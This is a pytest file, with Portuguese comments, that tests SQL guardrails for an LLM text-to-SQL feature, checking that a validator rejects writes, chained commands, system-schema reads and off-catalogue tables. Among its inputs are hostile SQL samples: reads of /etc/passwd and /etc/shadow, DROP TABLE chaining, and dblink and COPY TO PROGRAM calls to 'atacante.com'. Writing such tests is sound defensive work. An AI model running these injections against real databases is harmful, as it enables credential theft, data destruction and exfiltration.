"""Testes dos guardrails de SQL.

Cada caso aqui é um ataque real ou um erro real de LLM, não um exemplo didático.
Quando um novo jeito de burlar aparecer, ele vira um caso neste arquivo antes de
a correção ser escrita.
"""

import pytest

from app.text2sql.guardrails import SqlRecusado, aplicar_limite, validar

# Catálogo de uma conexão fictícia, no formato que o `Tabela` produz.
TABELAS = {"vendas.pedidos", "vendas.itens", "cadastro.clientes"}


# ─── O que precisa passar ─────────────────────────────────────────────────────


def test_select_simples_passa():
    r = validar("SELECT id, total FROM vendas.pedidos", tabelas_permitidas=TABELAS)
    assert r.tabelas_referenciadas == {"vendas.pedidos"}
    assert not r.tem_agregacao


def test_agregacao_com_join_passa():
    sql = """
        SELECT c.nome, sum(p.total) AS total
        FROM vendas.pedidos p
        JOIN cadastro.clientes c ON c.id = p.cliente_id
        GROUP BY c.nome
    """
    r = validar(sql, tabelas_permitidas=TABELAS)
    assert r.tem_agregacao
    assert r.tabelas_referenciadas == {"vendas.pedidos", "cadastro.clientes"}


def test_cte_de_leitura_passa():
    sql = """
        WITH recentes AS (SELECT * FROM vendas.pedidos WHERE total > 100)
        SELECT count(*) FROM recentes
    """
    r = validar(sql, tabelas_permitidas=TABELAS)
    # `recentes` é uma CTE, não uma tabela do banco: não pode exigir lista branca.
    assert r.tabelas_referenciadas == {"vendas.pedidos"}


# ─── Escrita e DDL ────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "DROP TABLE vendas.pedidos",
        "DELETE FROM vendas.pedidos",
        "UPDATE vendas.pedidos SET total = 0",
        "INSERT INTO vendas.pedidos (id) VALUES (1)",
        "TRUNCATE TABLE vendas.pedidos",
        "CREATE TABLE x (id int)",
        "ALTER TABLE vendas.pedidos ADD COLUMN x int",
        "GRANT SELECT ON vendas.pedidos TO publico",
    ],
)
def test_escrita_e_ddl_sao_recusados(sql):
    with pytest.raises(SqlRecusado):
        validar(sql, tabelas_permitidas=TABELAS)


def test_escrita_escondida_em_cte_e_recusada():
    """O caminho que passa por quase toda lista de palavras proibidas."""
    sql = """
        WITH apagados AS (DELETE FROM vendas.pedidos RETURNING id)
        SELECT count(*) FROM apagados
    """
    with pytest.raises(SqlRecusado):
        validar(sql, tabelas_permitidas=TABELAS)


def test_escrita_em_subconsulta_e_recusada():
    sql = "SELECT * FROM (INSERT INTO vendas.pedidos (id) VALUES (1) RETURNING id) t"
    with pytest.raises(SqlRecusado):
        validar(sql, tabelas_permitidas=TABELAS)


# ─── Encadeamento ─────────────────────────────────────────────────────────────


def test_comandos_encadeados_sao_recusados():
    with pytest.raises(SqlRecusado, match="único comando"):
        validar("SELECT 1; DROP TABLE vendas.pedidos", tabelas_permitidas=TABELAS)


def test_ponto_e_virgula_final_sozinho_nao_atrapalha():
    r = validar("SELECT id FROM vendas.pedidos;", tabelas_permitidas=TABELAS)
    assert r.tabelas_referenciadas == {"vendas.pedidos"}


# ─── Funções perigosas ────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_sleep(60)",
        "SELECT dblink('host=atacante.com', 'SELECT 1')",
        "SELECT lo_import('/etc/shadow')",
    ],
)
def test_funcoes_perigosas_sao_recusadas(sql):
    with pytest.raises(SqlRecusado):
        validar(sql, tabelas_permitidas=None)


# ─── Esquema de sistema e lista branca ────────────────────────────────────────


def test_esquema_de_sistema_e_recusado():
    with pytest.raises(SqlRecusado, match="sistema"):
        validar("SELECT * FROM pg_catalog.pg_shadow", tabelas_permitidas=None)


def test_information_schema_e_recusado():
    with pytest.raises(SqlRecusado):
        validar("SELECT * FROM information_schema.tables", tabelas_permitidas=None)


def test_tabela_fora_do_catalogo_e_recusada():
    with pytest.raises(SqlRecusado, match="dicionário"):
        validar("SELECT * FROM financeiro.salarios", tabelas_permitidas=TABELAS)


def test_join_com_tabela_fora_do_catalogo_e_recusado():
    """Uma tabela permitida na consulta não autoriza as outras do mesmo JOIN."""
    sql = """
        SELECT * FROM vendas.pedidos p
        JOIN secreto.folha f ON f.id = p.cliente_id
    """
    with pytest.raises(SqlRecusado, match="dicionário"):
        validar(sql, tabelas_permitidas=TABELAS)


# ─── Entrada malformada ───────────────────────────────────────────────────────


def test_sql_vazio_e_recusado():
    with pytest.raises(SqlRecusado):
        validar("   ", tabelas_permitidas=TABELAS)


def test_texto_que_nao_e_sql_e_recusado():
    with pytest.raises(SqlRecusado):
        validar("me dê os dez maiores clientes por favor", tabelas_permitidas=TABELAS)


# ─── LIMIT ────────────────────────────────────────────────────────────────────


def test_limite_e_aplicado_quando_falta():
    sql = aplicar_limite("SELECT id FROM vendas.pedidos", 100)
    assert "LIMIT 100" in sql.upper()


def test_limite_existente_e_preservado():
    sql = aplicar_limite("SELECT id FROM vendas.pedidos LIMIT 5", 100)
    assert "LIMIT 5" in sql.upper()
    assert "LIMIT 100" not in sql.upper()


# ─── Comentários ──────────────────────────────────────────────────────────────


def test_comentario_nao_sobrevive_a_normalizacao():
    """O SQL executado é regerado da AST e não carrega comentário nenhum.

    Fecha o vetor `SELECT 1 -- */ ; DROP TABLE t`, em que o comentário de linha
    vira bloco na regeneração e um `*/` embutido fecharia o bloco cedo.
    """
    r = validar(
        "SELECT id FROM vendas.pedidos -- */ ; DROP TABLE vendas.pedidos",
        tabelas_permitidas=TABELAS,
    )
    assert "/*" not in r.sql
    assert "DROP" not in r.sql.upper()


def test_copy_para_programa_e_recusado():
    with pytest.raises(SqlRecusado):
        validar("COPY vendas.pedidos TO PROGRAM 'curl atacante.com'", tabelas_permitidas=TABELAS)
